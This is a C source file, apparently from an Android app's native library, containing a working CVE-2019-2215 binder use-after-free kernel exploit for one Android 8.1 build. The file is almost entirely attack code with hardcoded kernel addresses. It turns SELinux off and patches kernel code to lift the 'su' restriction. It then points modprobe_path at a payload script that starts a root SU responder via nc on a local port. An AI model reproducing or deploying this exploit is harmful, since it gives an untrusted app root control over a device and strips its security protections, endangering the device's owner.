/*
 * esc8.c -- route 8: Android 8.1 (3.18.71-perf-g8a8c60dd) escalation for the APK.
 *
 * Same kernel write primitive tools/exp8/w2215.c proved on-device (CVE-2019-2215,
 * binder UAF -> arbitrary kernel write), compiled into libesc.so instead of being
 * shipped as a binary the app would have to exec: the app process is untrusted_app,
 * and the route must not depend on executing a static ELF from the app's data dir
 * before SELinux has been turned off.
 *
 * Why the payload is a SHELL SCRIPT and not the `sud` daemon of routes 6/7:
 * measured 2026-10-23 -- a raw static ELF (libc-free, `_start` + exit_group) runs
 * correctly in the kernel helper's u:r:kernel:s0 context, but an NDK-static libc
 * binary reports success and produces no effect at all (t42 returns 0 instead of
 * 42; open() returns an fd for files that never appear).  /system/bin dynamic
 * binaries and #! scripts run fine.  So modprobe_path points at a script that
 * starts an SU responder with /system/bin/sh + toybox nc.
 *
 *   step 1  write selinux_enforcing = 0            (4 bytes! 8 clears the
 *           neighbouring global and panics -- measured)
 *   step 2  write modprobe_path = <script>
 *   step 3  make the kernel ask for an unknown binfmt / net-pf module, which
 *           execs modprobe_path as uid 0 in the kernel domain
 *
 * Addresses are for PD1610_D_8.19.16 only; the function refuses to write unless uname(2)'s
 * release says 3.18.71-perf-g8a8c60dd (the proc file itself is unreadable from the app
 * domain on this ROM), so a wrong ROM costs a refusal, not a write into whatever lives at
 * those addresses elsewhere.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <sched.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/uio.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <unistd.h>

#define BINDER_THREAD_EXIT8 0x40046208u
#define IOV_N8      25
#define FILL8       0x10001UL
#define PAYLOAD8    32

/* PD1610_D_8.19.16 / 3.18.71-perf-g8a8c60dd (relocate only with a fresh
 * disassembly: selinux_enforcing from enforcing_setup's `str w1,[x0,#0x1cc]`,
 * modprobe_path from the data symbol). */
#define ENFORCE8_ADDR   0xffffffc001b1b1ccUL
#define MODPROBE8_ADDR  0xffffffc001815540UL
#define HANDLER_PORT8   12346

/* The 8.1 name gate lives in the function at 0xffffffc0001cb3cc: do_execveat_common
 * calls it (via 0x1cb5dc and 0x1d1f74) whenever the exec'd name is exactly "su",
 * and it only lets the exec through when the CALLER's cred has uid/gid/suid/sgid/
 * euid/egid all zero (i.e. root).  Every other process gets EPERM.
 *
 * Its first two instructions are replaced with `mov w0,#0; ret` (return "allowed").
 * The page is .text and read-only, so it is reached through the fixmap: bm_pte[1]
 * (slot 0 is unused -- the fixmap proper starts at pte index 0x37) is pointed at
 * the text page's physical address and the alias VA 0xffffffbffbc01000 becomes a
 * writable mapping of it.  Measured 2026-10-23: applying this before any `su`
 * attempt makes a real file named `su` exec fine as uid 2000 (rc 42), repeatably.
 * If some boot code has already exec'd `su`, the line sits in the I-cache and the
 * patch only takes effect after a reboot. */
#define FIXMAP_PTE1_ADDR 0xffffffc0019d3008UL    /* bm_pte[1] */
#define FIXMAP_ALIAS8    0xffffffbffbc01000UL
#define GATE8_PTE_VALUE  0x401cb713UL            /* PA 0x401cb000 | AF|SH|AttrIdx4|page */
#define GATE8_E_OFF      0x3ccUL                 /* 0x1cb3cc - 0x1cb000 */

struct elog8 {
    char *out;
    int cap;
    int len;
};

static void el8(struct elog8 *e, const char *fmt, ...)
{
    va_list ap;
    int n;

    if (e->len >= e->cap - 1)
        return;
    va_start(ap, fmt);
    n = vsnprintf(e->out + e->len, (size_t) (e->cap - e->len), fmt, ap);
    va_end(ap);
    if (n > 0)
        e->len += n;
    if (e->len > e->cap - 1)
        e->len = e->cap - 1;
}

static unsigned char dummy8[4096] __attribute__((aligned(64)));
static unsigned char *big8;
static unsigned char *fill8;

static int init8(void)
{
    if (big8 != NULL)
        return 0;
    big8 = mmap(NULL, 0x30000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (big8 == MAP_FAILED) {
        big8 = NULL;
        return -1;
    }
    memset(big8, 0, 0x30000);
    fill8 = malloc(FILL8);
    if (fill8 == NULL)
        return -1;
    memset(fill8, 'A', FILL8);
    return 0;
}

static void pin_cpu0_8(void)
{
    cpu_set_t set;

    CPU_ZERO(&set);
    CPU_SET(0, &set);
    (void) sched_setaffinity(0, sizeof(set), &set);
}

static ssize_t read_file8(const char *path, char *buf, size_t cap)
{
    int fd = open(path, O_RDONLY);
    ssize_t n;

    if (fd < 0)
        return -1;
    n = read(fd, buf, cap - 1);
    close(fd);
    if (n < 0)
        return -1;
    buf[n] = 0;
    return n;
}

/* Route gate: the build-tag check.  The app domain CANNOT read
 * /proc/sys/kernel/osrelease on 8.1 (measured: EACCES from untrusted_app,
 * while the adb shell can), so the read would refuse every run from inside
 * the app.  uname(2) returns the identical string and is not an SELinux read
 * -- Chain.java routes on the same source (System.getProperty("os.version")).
 * Always fills rel (empty on an uname failure), returns 1 on a tag match. */
static int release8_is(char *rel, size_t cap)
{
    struct utsname u;

    rel[0] = 0;
    if (uname(&u) != 0)
        return 0;
    snprintf(rel, cap, "%s", u.release);
    return strstr(u.release, "3.18.71-perf-g8a8c60dd") != NULL;
}

/* 0 = the kernel reads it, 1 = still enforcing, -1 = unreadable from this domain */
static int enforce8(void)
{
    char b[32];
    ssize_t n = read_file8("/sys/fs/selinux/enforce", b, sizeof b);

    if (n <= 0)
        return -1;
    if (b[0] == '0')
        return 0;
    if (b[0] == '1')
        return 1;
    return -1;
}

/* 1 = ours, 0 = something else, -1 = unreadable */
static int modprobe8_is(const char *want)
{
    char b[256];
    ssize_t n = read_file8("/proc/sys/kernel/modprobe", b, sizeof b);
    size_t l;

    if (n <= 0)
        return -1;
    l = strlen(b);
    while (l > 0 && (b[l - 1] == '\n' || b[l - 1] == '\r'))
        b[--l] = 0;
    return strcmp(b, want) == 0 ? 1 : 0;
}

static int port8_up(void)
{
    struct sockaddr_in a;
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    int rc;

    if (fd < 0)
        return 0;
    memset(&a, 0, sizeof a);
    a.sin_family = AF_INET;
    a.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    a.sin_port = htons(HANDLER_PORT8);
    rc = connect(fd, (struct sockaddr *) &a, sizeof a);
    close(fd);
    return rc == 0;
}

/* One shot of the primitive.  Returns readv()'s count; success is
 * FILL8 + PAYLOAD8 + datalen (the 32-byte payload rewrites iov[10].len and
 * iov[11], so the final datalen bytes land at `target`). */
static ssize_t w8_try_once(unsigned long target, const unsigned char *data, size_t datalen)
{
    int epfd, bfd, pfd[2];
    struct iovec iov[IOV_N8];
    struct epoll_event ev;
    unsigned char payload[PAYLOAD8];
    unsigned char wbuf[4096];
    pid_t pid;
    ssize_t r;
    int i, st;

    bfd = open("/dev/binder", O_RDONLY);
    if (bfd < 0)
        return -1;
    epfd = epoll_create1(0);
    if (epfd < 0) {
        close(bfd);
        return -1;
    }
    memset(&ev, 0, sizeof ev);
    ev.events = EPOLLIN;
    if (epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev) != 0) {
        close(epfd);
        close(bfd);
        return -1;
    }
    if (pipe(pfd) != 0) {
        close(epfd);
        close(bfd);
        return -1;
    }
    (void) fcntl(pfd[1], F_SETPIPE_SZ, 1 << 17);

    memset(iov, 0, sizeof iov);
    for (i = 0; i < IOV_N8; i++)
        iov[i].iov_base = dummy8;
    iov[9].iov_base = big8;
    iov[9].iov_len = 0;                              /* becomes FILL8 after list_del */
    iov[10].iov_base = big8;
    iov[10].iov_len = FILL8 + PAYLOAD8 + datalen;    /* import-time total */

    memset(payload, 0, sizeof payload);
    *(uint64_t *) (payload + 0) = 0;
    *(uint64_t *) (payload + 8) = PAYLOAD8;          /* iov[10].len == offset -> advance */
    *(uint64_t *) (payload + 16) = target;           /* iov[11].base */
    *(uint64_t *) (payload + 24) = datalen;          /* iov[11].len */

    memset(wbuf, 0, sizeof wbuf);
    memcpy(wbuf, data, datalen);

    pid = fork();
    if (pid < 0) {
        close(pfd[0]);
        close(pfd[1]);
        close(epfd);
        close(bfd);
        return -1;
    }
    if (pid == 0) {
        usleep(300000);                              /* parent imports + blocks */
        if (epoll_ctl(epfd, EPOLL_CTL_DEL, bfd, &ev) != 0)
            _exit(1);
        if (write(pfd[1], fill8, FILL8) != (ssize_t) FILL8)
            _exit(2);
        if (write(pfd[1], payload, PAYLOAD8) != PAYLOAD8)
            _exit(3);
        if (write(pfd[1], wbuf, sizeof wbuf) != (ssize_t) sizeof wbuf)
            _exit(4);
        usleep(200000);
        _exit(0);
    }

    ioctl(bfd, BINDER_THREAD_EXIT8, NULL);           /* free binder_thread */
    r = readv(pfd[0], iov, IOV_N8);                  /* reclaim + walk iovecs */

    waitpid(pid, &st, 0);
    close(pfd[0]);
    close(pfd[1]);
    close(epfd);
    close(bfd);
    return r;
}

/* N attempts at one write.  The carrier is probabilistic once per boot; the
 * measured first-shot rate on 8.19.16 is 5/5, so a small cap is enough and
 * keeps the crash surface (each miss is a list_del on a stale chunk) finite. */
static int w8_write(struct elog8 *e, const char *what, unsigned long target,
                    const unsigned char *data, size_t len, int tries)
{
    int i;

    for (i = 0; i < tries; i++) {
        ssize_t r = w8_try_once(target, data, len);

        el8(e, "%s try%d readv=%zd want=%lu; ", what, i + 1, r,
            (unsigned long) (FILL8 + PAYLOAD8 + len));
        if (r == (ssize_t) (FILL8 + PAYLOAD8 + len))
            return 0;
        usleep(120000);
    }
    return -1;
}

static void trigger8(const char *trigpath, struct elog8 *e)
{
    static const int protos[5] = {253, 254, 99, 89, 47};
    static const int types[2] = {SOCK_DGRAM, SOCK_STREAM};
    int pi, ti, fd, st;
    pid_t pid;

    /* (a) file-less: an unregistered inet protocol makes inet_create() call
     * request_module("net-pf-2-proto-P-type-T"), which execs modprobe_path.
     * This is the carrier that worked from an app process on 6.0.1. */
    for (pi = 0; pi < 5; pi++) {
        for (ti = 0; ti < 2; ti++) {
            int s = socket(AF_INET, types[ti], protos[pi]);
            int en = errno;

            if (s >= 0)
                close(s);
            el8(e, "sock-trigger proto=%d type=%d rc=%d errno=%d; ", protos[pi], types[ti], s, en);
            if (port8_up()) {
                el8(e, "handler up after socket trigger; ");
                return;
            }
        }
    }

    /* (b) classic bad-magic execve.  Kept as the second carrier: measured on
     * 6.0.1 to bring the helper up from the shell domain but not every app
     * process, so it is a fallback, never the only trigger. */
    fd = open(trigpath, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (fd >= 0) {
        static const unsigned char bm[4] = {0xff, 0xff, 0xff, 0xff};

        if (write(fd, bm, sizeof bm) != (ssize_t) sizeof bm)
            el8(e, "trig short write; ");
        close(fd);
        chmod(trigpath, 0755);
        pid = fork();
        if (pid == 0) {
            char *av[2] = {(char *) trigpath, NULL};
            char *ep[1] = {NULL};

            execve(trigpath, av, ep);
            _exit(127);
        }
        if (pid > 0)
            waitpid(pid, &st, 0);
    } else
        el8(e, "trig open errno=%d; ", errno);
}

int esc_escalate8(const char *payload, int rounds, char *out, int cap)
{
    struct elog8 e = {out, cap, 0};
    static const unsigned char zero4[4] = {0, 0, 0, 0};
    char osr[128], rp[PATH_MAX], trig[PATH_MAX + 8];
    int tries, rc, en, i;

    if (out == NULL || cap <= 0)
        return -1;
    out[0] = 0;

    /* The build tag, not just the version: a later 3.18.71 patch would move both globals. */
    if (!release8_is(osr, sizeof osr)) {
        el8(&e, "REFUSING: uname release '%s' is not 3.18.71-perf-g8a8c60dd, the build these "
                "addresses belong to", osr);
        return -1;
    }
    if (payload == NULL || access(payload, R_OK) != 0) {
        el8(&e, "REFUSING: payload '%s' is not readable (errno=%d)", payload ? payload : "(null)", errno);
        return -1;
    }
    if (realpath(payload, rp) == NULL)
        snprintf(rp, sizeof rp, "%s", payload);
    /* modprobe_path is char[256]; keep the path comfortably inside it.  The
     * kernel helper is handed the spelled path, so /data/user/0 must be
     * resolved to /data/data here (measured on the 6.0.1 route). */
    if (strlen(rp) + 1 > 200) {
        el8(&e, "REFUSING: payload path too long (%zu)", strlen(rp));
        return -1;
    }
    snprintf(trig, sizeof trig, "%s.trig", rp);

    if (init8() != 0) {
        el8(&e, "buffer setup failed (errno=%d)", errno);
        return -1;
    }
    pin_cpu0_8();
    tries = rounds < 1 ? 1 : (rounds > 4 ? 4 : rounds);

    /* 1. selinux_enforcing = 0.  MUST be exactly 4 bytes. */
    en = enforce8();
    if (en == 0) {
        el8(&e, "step1 skip: enforce already 0; ");
    } else {
        rc = w8_write(&e, "enforce", ENFORCE8_ADDR, zero4, 4, tries);
        if (rc != 0)
            return -10;
        en = enforce8();
        if (en == 1) {
            el8(&e, "step1 NOT APPLIED (readback still enforcing)");
            return -11;
        }
        el8(&e, "step1 ok (enforce readback=%d); ", en);
    }

    /* 2. name gate: the "su" checker returns 0 unconditionally.
     * Non-fatal on purpose: without it the escalation still works, only the
     * literal name `su` stays refused to apps (the old behaviour). */
    {
        static const unsigned char insn0[4] = {0x00, 0x00, 0x80, 0x52};  /* mov w0, #0 */
        static const unsigned char insn1[4] = {0xc0, 0x03, 0x5f, 0xd6};  /* ret       */
        unsigned char pte[8];
        unsigned long v = GATE8_PTE_VALUE;

        for (i = 0; i < 8; i++)
            pte[i] = (unsigned char) (v >> (i * 8));
        rc = w8_write(&e, "gate8-pte", FIXMAP_PTE1_ADDR, pte, 8, tries);
        if (rc == 0)
            rc = w8_write(&e, "gate8-insn0", FIXMAP_ALIAS8 + GATE8_E_OFF, insn0, 4, tries);
        if (rc == 0)
            rc = w8_write(&e, "gate8-insn1", FIXMAP_ALIAS8 + GATE8_E_OFF + 4, insn1, 4, tries);
        if (rc != 0)
            el8(&e, "step2 gate8 NOT APPLIED, `su` still root-only; ");
        else
            el8(&e, "step2 gate8 ok, `su` allowed; ");
    }

    /* 3. modprobe_path = payload */
    if (modprobe8_is(rp) == 1) {
        el8(&e, "step3 skip: modprobe_path already ours; ");
    } else {
        rc = w8_write(&e, "modprobe", MODPROBE8_ADDR, (const unsigned char *) rp,
                      strlen(rp) + 1, tries);
        if (rc != 0)
            return -20;
        if (modprobe8_is(rp) == 0) {
            el8(&e, "step3 NOT APPLIED on readback");
            return -21;
        }
        el8(&e, "step3 ok (readback %d); ", modprobe8_is(rp));
    }

    /* 4. run it */
    if (port8_up())
        el8(&e, "step4 skip: handler already up; ");
    else {
        trigger8(trig, &e);
        for (i = 0; i < 20; i++) {
            if (port8_up())
                break;
            usleep(250000);
        }
    }
    if (!port8_up()) {
        el8(&e, "step4 handler did NOT come up");
        return -30;
    }
    el8(&e, "done: enforce=%d(0=permissive) modprobe=%s handler=up",
        enforce8(), modprobe8_is(rp) == 1 ? "ours" : "?");
    return 0;
}
